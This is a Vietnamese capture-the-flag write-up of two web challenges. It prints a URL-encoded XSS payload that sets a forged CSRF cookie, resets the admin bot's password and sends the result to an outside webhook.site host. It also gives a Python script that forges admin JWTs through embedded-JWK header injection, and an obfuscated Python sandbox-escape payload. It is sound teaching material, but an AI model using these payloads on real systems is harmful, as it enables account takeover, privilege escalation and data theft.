# ChatGPT Made Me Do It

![alt text](images/image.png)

\- Truy cập trang web, thực hiện "Gia nhập tông môn" (Đăng ký tài khoản) và "Tiến nhập gia môn" (Đăng nhập)

![alt text](images/image1.png)



\- Đăng nhập thành công, nhận thấy chỉ có thêm "Tu sửa công pháp" (Đổi mật khẩu) và 
"Thượng lộ ngộ giáp" (Đưa link để bot admin ghé qua)

<details>
    <summary>routes.js (đổi mk)</summary>
    
```javascript=
    router.all('/cultivation/password', (req, res) => {
  const username = req.session?.username;
  const csrfToken = req.cookies.csrf_token;

  if (username === undefined) {
    return res.redirect('/immortal-gate/sign-in');
  } 

  if (req.headers['x-csrf-token'] !== csrfToken) {
    return res.send(alertBack('❌ Tâm ma tác sai, công kích bị ngăn chặn!'));
  }

  const newPassword = req.body.new_password || '';
  users.set(username, newPassword);

  return res.send(alertBack('✨ Công pháp tu sửa thành công!'));
});
```

</details>

\- Khi nghiên cứu đoạn source code ở trên, có thể thấy server đang so sánh cookie`csrf_token` và Header `x-csrf-token`
- Trong đó `csrf_token` được server Set-Cookie còn Header `x-csrf-token` mình phải tự thêm
- Đó là lí do vì sao khi tương tác với UI, ta nhận về *"❌ Tâm ma tác sai, công kích bị ngăn chặn!"*

\- Dòng thứ 13 cho ta biết, sau khi khớp cookie và header cần thiết, mật khẩu tài khoản sẽ thành **rỗng**


\- Khi thêm Header trên vào request gửi đến `/cultivation/password`

![image](images/image2.png)

&rarr; Reset mật khẩu thành rỗng

\- Tiếp đến với chức năng "báo cáo liên kết nguy hiểm"

<details>
    <summary>routes.js</summary>

```javascript=
function santi(str) {
  const tag = str.match(/<([^>]*)>/);

  if (tag && /[a-zA-Z]/.test(tag[1])) {
    return 'no hack';
  }

  return str;
}

...

router.all('/immortal-gate/report', (req, res) => {
  const username = req.session.username;

  if (username === undefined) return res.redirect('/immortal-gate/sign-in');

  if (req.method === 'GET') return res.send(renderReport());

  const url = req.body.url || '';
  if (!url.startsWith('http://') && !url.startsWith('https://')) {
    return res.send(alertBack('❌ Liên kết định dạng sai, phải bắt đầu bằng http:// hoặc https://!'));
  }

  visitUrl(url).catch((error) => {
    console.error(`Error occurred: ${error && error.stack ? error.stack : error}`);
  });

  return res.send(alertBack('✨ Đã thượng báo cho chưởng môn, cảm ơn cử báo!'));
});

router.all('/immortal-gate/check', (req, res) => {
  const name = req.query.name || req.session.username || '';
  res.write(`${santi(decodeURIComponent(String(name)))}, hello`);
  res.end();
});

```
    
</details>
    
\- Đoạn code này chứa 2 thứ có thể gây ra lỗ hổng
1.  Hàm `santi()` filter quá lỏng lẻo:
- Regex là: `/<([^>]*)>/`
- `/[a-zA-Z]/.test(tag[1])` cho ta biết sau khi lấy được chuỗi ở sau `<` và ở trước `>`, chuỗi này cần đảm bảo không có chữ cái để `return str`
- Ví dụ với `<html>Hello</html>`
    -  Khi này tag[0] là `<html>`
    -  Sau khi bỏ qua `< >`, ta đuợc tag[1] là `html`
    &rarr; Chứa kí tự bị blacklist
    - Trả về `no hack`

2.  `res.write()`: Sink
\- Hàm `santi()` quá yếu dẫn đến việc payload được ghi trực tiếp vào response, không escape HTML &rarr; Ghi trực tiếp vào `/immortal-gate/check` &rarr; `/immortal-gate/report` &rarr; XSS


### Khai thác
1. Bypass `santi()`, chạy JS trên trình duyệt của bot:
    
\- Với `<...>` đầu tiên, trong đó ... không được phép chứa chữ, nhưng tổng thể payload vẫn hợp lệ
\- Thử với 
    
```
< !--><script>new Image().src="https://webhook.site/9ac3d7b7-ac1e-482b-b552-e62f0994199a?xss=1"</script>
```

&rarr; URL Encode:


```
http://localhost:3000/immortal-gate/check?name=%3C!--%3E%3Cscript%3Enew%20Image().src%3D%22https%3A%2F%2Fwebhook.site%2F9ac3d7b7-ac1e-482b-b552-e62f0994199a%3Fxss%3D1%22%3C%2Fscript%3E
```

\- Gửi thẳng vào "🌐 Ngộ pháp liên kết" và nhận được:
![alt text](images/image3.png)

&rarr; Confirm XSS khi script js đã được thực thi trên trình duyệt của bot
    
2.  Bypass Header `x-csrf-token`
 và Cookie `csrf_token`, hoàn thiện payload &rarr; CSRF
    
\- Ta cần ép trình duyệt của bot gửi đi request đổi mật khẩu
    
\- Thế nhưng như đã thử reset mật khẩu ở trên, cookie và header cần phải khớp với nhau. 
    
\- Đối chiếu tới luồng đăng nhập
    
```javascript=
    if (users.get(username) === password) {
    res.cookie('csrf_token', crypto.randomBytes(16).toString('hex'), {
      httpOnly: true,
      path: '/',
      sameSite: 'strict',
    });
    req.session.username = username;
    return res.redirect('/');
  }
```
    
- Cookie `csrf_token` của bot được sinh ra hoàn toàn random. 
    
- Cookie là dữ liệu phía client gửi lên, lợi dụng lỗ hổng XSS để gửi request reset mk với cookie và header kể trên có giá trị giống nhau:

```javascript
document.cookie = "csrf_token=x; path=/cultivation/password";
```
    
```javascript
    fetch("/cultivation/password", {
    headers: {
      "x-csrf-token": "x"
    }
  })
```
    
****Payload****

```javascript
< !--><script>
const W = "https://webhook.site/9ac3d7b7-ac1e-482b-b552-e62f0994199a"; document.cookie = "csrf_token=x; path=/cultivation/password";
fetch("/cultivation/password", {
    headers: {
      "x-csrf-token": "x"
    }
  }).then(r => r.text()).then(t => {
    new Image().src = W + "?pwchange=" + encodeURIComponent(t).slice(0, 1500)
  })
</script>
```

&rarr; URL-encode:

```javascript!
http://localhost:3000/immortal-gate/check?name=%3C!--%3E%3Cscript%3Econst%20W%3D%22https%3A%2F%2Fwebhook.site%2F9ac3d7b7-ac1e-482b-b552-e62f0994199a%22%3Bdocument.cookie%3D%22csrf_token%3Dx%3B%20path%3D%2Fcultivation%2Fpassword%22%3Bfetch(%22%2Fcultivation%2Fpassword%22%2C%7Bheaders%3A%7B%22x-csrf-token%22%3A%22x%22%7D%7D).then(r%3D%3Er.text()).then(t%3D%3E%7Bnew%20Image().src%3DW%2B%22%3Fpwchange%3D%22%2BencodeURIComponent(t).slice(0%2C1500)%7D)%3C%2Fscript%3E
```

![image](images/image4.png)

$\implies$ Thành công reset mật khẩu của bot admin và confirm CSRF
    
> KMACTF{sk-proj-7hK92bQwXn4MzP8rTaYvLcE3sDfGhJkLmNpQrStUvWx}

    
# KMA Labs Developer Portal

### Reconnaissance   
![alt text](images/image-1.png)
\- Với thông tin được cung cấp `guest:guest123`, tiến hành đăng nhập và vào bên trong trang web

\- Đăng nhập thành công, ta được redirect đến `/dashboard`, một giao diện chào đón người dùng với access level: User
![alt text](images/image-2.png)

\- Thành navbar còn có các chức năng như:
- Sandbox: trả về `/dashboard?error=access_denied`, truy cập bị từ chối
- API Docs: trả về `Status code 500 Internal Server Error`. Khi mở ticket để hỏi các author thì infra vẫn chạy bình thường, có thể đây là chủ ý của tác giả
- Settings: tạo các key và quyền hạn cho user tự thiết lập, ví dụ như read,write,execute hoặc read,write
![alt text](images/image-3.png)

\- Đây là một chall blackbox nên mình đã mất khá nhiều thời gian vào việc khai thác endpoint `/settings`. Vì đây gần là vị trí như duy nhất có khả năng gây ra lỗ hổng so với `/docs` hay `/dashboard`

### Phân tích và khai thác cookie

\- Thế nhưng, khi nhìn kĩ lại Header Cookie trong các request khi đăng nhập:
```
Cookie: token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImttYS1pZHAtcnNhLTAxIn0.eyJzdWIiOiJndWVzdCIsInJvbGUiOiJ1c2VyIiwiaXNzIjoia21hLWN0Zi1hdXRoIiwiaWF0IjoxNzgxODU1NzAwLCJleHAiOjE3ODE4NjI5MDB9.RPb5k5_TSlIPTCuI8U6GlIEwLBeQ_Y7r1RVrlZBBbBAZwoTAJAE2noMSYk97-3fF-V6RFqJ2hW8Rmz2EHkMh95iyIF6WIKtlJc3nuhEdLwDMyY3ZcS_Rzhazulo4mrQGEUJSDPiGzK5OrLrfcaoj6cvN2SZlQ79yIBrarwiLssQOYLDTAOavLXoWlLY8_zRLC9wS8kUcJo85BlZtlzEmSBSoDkoOGaQZT32NL8iuzd2gj6eq71FKayRgdRo3F8WSXDh43jat7KLhXieH8cxCkORufqc6fZB6Sv2q341ItKKlaYJYXPWGrhbMKLz6DTR5_cZ-9dLWxz5j0wOyKsH9QA
```
![alt text](images/image-5.png)

&rarr; Mình nghĩ chall này sẽ khai thác theo hướng JWT attacks hoặc Insecure Deserialization

\- Cookie `token` chứa một JWT sử dụng thuật toán RS256 và có trường `kid=kma-idp-rsa-01`. Khi đưa token lên `jwt.io`, công cụ hiển thị Unable to retrieve public key (do công cụ không có khóa công khai để verify)

\- Khi tham khảo các cách khai thác cho chall này dựa trên những phân tích, thuộc tính `kid` *(Key ID)* cùng với `jwk` *(JSON Web Key)* là nơi thường xuyên xảy ra lỗ hổng
- `kid` là định danh của public key mà server dùng để verify token
- `jwk` là public key được biểu diễn dưới dạng JSON, ta có thể tự tạo và nhúng vào JWT

\- Cách bypass dần đã được hình thành: nhập vào `kid` một giá trị khác, thêm public JWK và ký token bằng private key tương ứng, server trực tiếp xử lý lỏng lẻo như: không tìm thấy key theo `kid`, rồi fallback sang dùng `jwk` trong header. Cookie dùng để khai thác sau khi đã được decode: 

```json
Header:
  {
    "alg": "RS256",
    "typ": "JWT",
    "kid": "owned",
    "jwk": {
      "kty": "RSA",
      "n": "...",
      "e": "AQAB",
      "key_ops": ["verify"]
    }
  }
Payload: 
  {
    "sub": "guest",
    "role": "admin",
    "iss": "kma-ctf-auth",
    "iat": 1781855700,
    "exp": 1781862900
  }
```
- `kid`: đã được đổi sang một giá trị mới do mình tự nhập
- `n`: RSA modulus. Là thân của public key và là phần lớn nhất của RSA public key
- `e`: RSA public exponent. AQAB là base64url của số 65537, public exponent phổ biến nhất trong RSA
- `key_ops`: key operations. Public key này dùng để verify chữ kí
- `role`: đổi sang admin, nhằm thực hiện leo quyền

```
Về toán học, RSA public key gồm cặp: (n, e)

Trong đó:

  n = p * q

với p, q là hai số nguyên tố lớn. n trong JWK được encode bằng base64url, e = 65537.
```

\- Đến đây, ta cần áp dụng logic trên vào việc tạo ra một cookie mới, ép server chấp nhận các thuộc tính trong cookie do mình kiểm soát, dùng JWK để verify chữ ký, nhưng không xác minh JWK có thuộc nguồn tin cậy hay không

\- Luồng khai thác:

```text
Script tạo attacker private key + attacker public key
          |
          | private key ký JWT giả
          v
JWT role=admin + kid=owned + jwk={attacker public key}
          |
          v
Server tin public key trong jwk
          |
          | verify thành công
          v
Attacker được coi là admin
```

<details>

<summary>forge_token.py</summary>

```python
import json
import time

import jwt
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from jwt.algorithms import RSAAlgorithm

key = rsa.generate_private_key(public_exponent=65537, key_size=2048)

priv = key.private_bytes(
    serialization.Encoding.PEM,
    serialization.PrivateFormat.PKCS8,
    serialization.NoEncryption(),
)

pub_jwk = json.loads(RSAAlgorithm.to_jwk(key.public_key()))

now = int(time.time())

token = jwt.encode(
    {
        "sub": "guest",
        "role": "admin",
        "iss": "kma-ctf-auth",
        "iat": now,
        "exp": now + 7200,
    },
    priv,
    algorithm="RS256",
    headers={
        "alg": "RS256",
        "typ": "JWT",
        "kid": "owned",
        "jwk": pub_jwk,
    },
)

print(token)
```

</details>

\- Chạy script và thay đổi giá trị cookie `token` bằng output của script

![alt text](images/image-6.png)

&rarr; Lỗ hổng JWT authentication bypass via embedded JWK header injection

$\implies$ Thành công leo quyền thành admin và có thể truy cập Sandbox

### Bypass sandbox

\- Sandbox chạy trên python 3.11, với filter nhằm hạn chế các từ khóa nhạy cảm như: `chr, __import__, print, open, os`

\- Payload ban đầu, list ra các file và thư mục trong `/tmp` và in ra màn hình:

```python
import os

directory = "/tmp"
files = os.listdir(directory)

print(files)
print(open(directory + "/" + files[0]).read())
```

\- Dĩ nhiên nó sẽ bị filter do sandbox này chặn string và numeric literals (những giá trị có sẵn trong source code), nhưng vẫn cho boolean literals

&rarr; Thực hiện deobfuscate theo hướng True/False, ta có

<details>
    <summary>Payload bypass sandbox</summary>

```python
S=().__class__.__mro__[True].__subclasses__()
B=S[((True<<True<<True<<True<<True<<True<<True<<True)+(True<<True<<True<<True<<True<<True<<True)+(True<<True<<True<<True)+(True<<True<<True))]()._module.__builtins__
V=().__class__(B.values())
C=V[((True<<True<<True<<True)+(True<<True<<True)+(True<<True))]
I=V[((True<<True<<True)+(True<<True))]
O=V[((True<<True<<True<<True<<True<<True<<True<<True)+(True<<True<<True<<True<<True)+(True<<True<<True)+(True<<True))]
P=V[((True<<True<<True<<True<<True<<True)+(True<<True<<True<<True)+(True<<True))]
M=I(C(((True<<True<<True<<True<<True<<True<<True)+(True<<True<<True<<True<<True<<True)+(True<<True<<True<<True)+(True<<True<<True)+(True<<True)+True))+C(((True<<True<<True<<True<<True<<True<<True)+(True<<True<<True<<True<<True<<True)+(True<<True<<True<<True<<True)+(True<<True)+True)))
D=C(((True<<True<<True<<True<<True<<True)+(True<<True<<True<<True)+(True<<True<<True)+(True<<True)+True))+C(((True<<True<<True<<True<<True<<True<<True)+(True<<True<<True<<True<<True<<True)+(True<<True<<True<<True<<True)+(True<<True<<True)))+C(((True<<True<<True<<True<<True<<True<<True)+(True<<True<<True<<True<<True<<True)+(True<<True<<True<<True)+(True<<True<<True)+True))+C(((True<<True<<True<<True<<True<<True<<True)+(True<<True<<True<<True<<True<<True)+(True<<True<<True<<True<<True)))
L=M.listdir(D)
P(L)
P(O(D+C(((True<<True<<True<<True<<True<<True)+(True<<True<<True<<True)+(True<<True<<True)+(True<<True)+True))+L[False]).read())

```
</details>

![alt text](images/image-7.png)

>KMACTF{n0_str1ng_n0_num_bu1lt1ns_3sc4p3_py_j41l_1337}